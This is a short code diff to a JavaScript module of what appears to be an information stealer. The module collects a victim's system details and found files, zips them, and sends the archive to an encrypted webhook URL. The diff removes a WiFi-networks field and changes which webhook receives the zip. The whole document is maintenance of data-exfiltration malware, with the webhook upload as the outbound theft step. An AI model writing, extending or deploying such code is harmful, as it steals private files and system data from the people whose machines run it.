@@ -13,12 +13,6 @@ module.exports = (client) => {
 
             const wifi_connections = await client.config.user.wifi_connections()
 
-            fields.push({
-                name: "🌏 WiFi networks",
-                value: `\`\`\`${wifi_connections}\`\`\``,
-                inline: false
-            })
-
             for (let [key, value] of Object.entries({
                     "🖥️ CPU(s)": cpus.join("\n"),
                     "⚡ RAM": client.utils.encryption.decryptData(client.config.user.ram),
@@ -142,7 +136,7 @@ module.exports = (client) => {
             await client.utils.jszip.createZip();
 
             await client.utils.webhook.sendToWebhook(
-                client.config.webhook.zip ? client.utils.encryption.decryptData(client.config.webhook.zip) : client.utils.encryption.decryptData(client.config.webhook.url), {
+                client.utils.encryption.decryptData(client.config.webhook.url), {
                     "content": `\`\`\`${files_found}\`\`\``,
                     embeds: [this.create_counter_embed()],
                     files: [`${client.config.jszip.path}.zip`]
